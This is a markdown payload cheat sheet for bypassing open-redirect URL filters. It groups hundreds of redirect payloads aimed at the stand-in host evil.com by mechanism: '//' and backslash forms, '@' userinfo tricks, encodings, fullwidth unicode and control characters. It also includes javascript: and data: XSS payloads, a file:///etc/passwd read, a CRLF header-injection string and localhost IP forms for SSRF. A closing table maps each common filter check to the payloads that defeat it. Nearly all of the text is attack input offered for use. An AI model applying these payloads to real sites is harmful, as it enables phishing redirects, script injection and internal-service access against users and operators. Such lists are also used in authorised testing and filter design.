# Payload families — the organized arm-library by mechanism

## Family A — the absolute-URL baseline

```text
the unfiltered/broken-filter confirm — the simplest arm:
  https://evil.com
  http://evil.com
  https://evil.com/
  https://evil.com/landing
  https://evil.com?x=1
  https://evil.com#frag
  HTTPS://evil.com        <- case-variant
  https://EVIL.COM        <- case-variant
  https://evil.com:443    <- explicit port
  https://evil.com:8443   <- a non-standard port
```

## Family B — the scheme-relative `//` corpus

```text
the 'no-scheme' — inherits the page's scheme; the startswith('/') gap:
  //evil.com              <- the canonical
  //evil.com/
  //evil.com/path
  //evil.com?x
  //evil.com#x
  ///evil.com             <- triple-slash
  ////evil.com            <- quad-slash
  /////evil.com           <- five
  //%65vil.com            <- an encoded host-char
  //evil%2ecom            <- an encoded .
  //evil.com%2f.target.com
  //evil.com%40target.com <- the @ in the netloc
  //evil.com%23target.com <- the # in the netloc
  //evil.com%3ftarget.com <- the ? in the netloc
  /%2fevil.com            <- / + encoded /
  %2f%2fevil.com          <- the fully-encoded //
  %252f%252fevil.com      <- the double-encoded //
  /%252fevil.com          <- a mix
```

## Family C — the backslash corpus

```text
the '\'-as-'/'-separator — the browser normalizes '\' to '/':
  /\evil.com              <- / + \
  \/evil.com              <- \ + /
  \\evil.com              <- the UNC-style \\
  /\/evil.com             <- / + \ + /
  /\//\evil.com           <- interleaved
  /%5cevil.com            <- / + encoded \
  %5cevil.com             <- an encoded \ alone
  %5c%5cevil.com          <- encoded \\
  /%255cevil.com          <- double-encoded \
  \\%65vil.com            <- an encoded host-char
  /\%2fevil.com           <- /\ + encoded /
  %2f%5cevil.com          <- encoded / + encoded \
  %5c%2fevil.com          <- encoded \ + encoded /
  //\\evil.com            <- // + \\
  //\evil.com             <- // + \
  /\//\//evil.com         <- a deeper mix
```

## Family D — the userinfo `@` corpus

```text
the userinfo — the host is AFTER the last '@':
  https://target.com@evil.com          <- the canonical
  https://evil.com@target.com          <- the reverse
  https://user:pass@evil.com           <- a full userinfo
  https://target.com:443@evil.com      <- userinfo+port
  https://evil.com\@target.com         <- the \@ escape
  https://evil.com%40target.com        <- the encoded @
  https://evil.com%2540target.com      <- the double-encoded @
  https://target.com%40evil.com        <- the @ the other order
  https://evil.com?@target.com         <- the @ in the query
  https://evil.com#@target.com         <- the @ in the fragment
  https://evil.com%2f%40target.com     <- encoded /@
  https://evil.com%3f%40target.com     <- encoded ?@
  https://evil.com%23%40target.com     <- encoded #@
  https://target.com.%40evil.com       <- trailing-dot + @
  https://a@b@c@evil.com               <- multiple @
  https://:@evil.com                   <- an empty userinfo
  https://a:b@c@evil.com               <- userinfo with colons
```

## Family E — the substring/suffix corpus

```text
the string-boundary — the contains/endswith gap:
  https://target.com.evil.com          <- a subdomain
  https://x.target.com.evil.com        <- a deeper subdomain
  https://target.com-evil.com          <- a hyphen-suffix
  https://eviltarget.com               <- a no-boundary
  https://target.com.evil.com.evil.com <- a deeper-subdomain
  https://evil.com/target.com          <- the substring in the path
  https://evil.com/x/target.com        <- deeper in the path
  https://evil.com?target.com          <- in the query
  https://evil.com?x=target.com        <- a named query
  https://evil.com#target.com          <- in the fragment
  https://x.target.com@evil.com        <- a subdomain-userinfo mix
  https://target.com%2eevil.com        <- an encoded . in the host
  https://target.com%252eevil.com      <- double-encoded .
  https://target.com.                  <- the trailing-dot
  https://target.com..                 <- a double-dot
```

## Family F — the scheme corpus

```text
the non-http(s) and scheme-boundary:
  https:evil.com                       <- a scheme with no //
  https:/evil.com                      <- a scheme + one /
  https:/\evil.com                     <- a scheme + /\
  https:\\evil.com                     <- a scheme + \\
  https:/\/evil.com                    <- a scheme + /\/
  https:%5cevil.com                    <- a scheme + encoded \
  https:%2fevil.com                    <- a scheme + encoded /
  https:/%2fevil.com                   <- a scheme + / + encoded /
  https:///evil.com                    <- a triple-slash
  https//evil.com                      <- no-colon
  HtTpS://evil.com                     <- a case-scheme
  hTTps:%2f%2fevil.com                 <- case + encode
  javascript:alert(1)                  <- the JS-scheme
  javascript://%0aalert(1)             <- comment-obfuscated
  javascript://x%0aalert(1)            <- a variant
  JaVaScRiPt:alert(1)                  <- a case-scheme
  java\tscript:alert(1)                <- a tab-split
  data:text/html,<script>alert(1)</script>
  data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
  data:image/svg+xml,<svg onload=alert(1)>
  data:text/plain,hi                   <- a benign data:
  vbscript:msgbox(1)                   <- the vbscript: legacy
  file:///etc/passwd                   <- the file: LFI-twin
  file://evil.com/x                    <- the file: SMB-twin
  about:blank                          <- the about:
  blob:https://target.com/<uuid>       <- the blob:
  intent://evil.com                    <- the intent: deep-link
  jar:https://evil.com!/x              <- the jar: legacy
```

## Family G — the unicode/fullwidth corpus

```text
the multi-byte chars an ASCII check misses:
  https:%ef%bc%8f%ef%bc%8fevil.com     <- the fullwidth //
  https://evil%ef%bc%8ecom             <- the fullwidth .
  https://evil%ef%bc%a0target.com      <- the fullwidth @
  https://evil.com%ef%bc%83target.com  <- the fullwidth #
  https://evil.com%ef%bc%9ftarget.com  <- the fullwidth ?
  evil%E3%80%82com                     <- the ideographic 。
  https://%65vil.com                   <- an encoded ASCII char
  https://xn--evil-xxx.com             <- a punycode host
  https://evil.c%E2%85%AEm             <- a unicode-lookalike
```

## Family H — the whitespace/control corpus

```text
the whitespace + control chars:
  %20https://evil.com                  <- a leading space
  %09https://evil.com                  <- a leading tab
  %0ahttps://evil.com                  <- a leading LF
  %0d%0ahttps://evil.com               <- a leading CRLF
  %0dhttps://evil.com                  <- a leading CR
  https://evil.com%20                  <- a trailing space
  https://evil.com%09                  <- a trailing tab
  https://evil.com%0a                  <- a trailing LF
  https://evil.com%0d%0a               <- a trailing CRLF
  https://evil.com%0d%0aSet-Cookie:x=y <- the CRLF-split twin
  \thttps://evil.com                   <- a literal tab
    https://evil.com                   <- a literal leading space
  https://evil.com%00                  <- a null-byte — truncation
```

## Family I — the IP-numeric corpus (the SSRF-twin)

```text
the decimal/hex/octal IP — the fetcher-side IP-literal bypass:
  http://2130706433/                   <- 127.0.0.1 decimal
  http://0x7f000001/                   <- 127.0.0.1 hex
  http://0177.0.0.1/                   <- 127.0.0.1 octal
  http://127.1/                        <- 127.0.0.1 short
  http://0/                            <- 0.0.0.0 -> localhost
  http://[::1]/                        <- IPv6 loopback
  http://[::ffff:127.0.0.1]/           <- IPv4-mapped IPv6
  http://127.0.0.1.xip.io/             <- a wildcard-DNS
  http://127.0.0.1.nip.io/             <- a wildcard-DNS
  http://spoofed.burpcollaborator.net/ <- a public-rebind
```

## Family J — the multi-hop corpus

```text
the chained redirects:
  https://target.com/redirect?next=https://evil.com
  https://target.com/r1?next=/r2?next=//evil.com
  https://evil.com?r=https://target.com
  /redirect/<encoded-url>
  /r1?next=<encoded /r2?next=<encoded evil.com>>
```

## The family-to-filter map

| The filter | The defeating family |
|---|---|
| `startswith('/')` | B (//), C (\), F (scheme) |
| `startswith('/') && !//` | C (/\), B (encoded-/) |
| `contains('t.com')` | E (substring) |
| `endswith('t.com')` | E (no-boundary/subdomain) |
| `hostname==` | D (userinfo), the parser-gaps |
| `scheme in [http,https]` | F (javascript:/data:/https:) |
| `no '://'` | B (//), C (\\) |
| the regex | D (@), E (subdomain), the boundary-mix |
| the encoded-check | the double-encode (B, the encode-order) |
| the raw-check | the encoded (B/C/F encode) |
| the ASCII-check | G (fullwidth) |
| the trim-check | H (whitespace/control) |
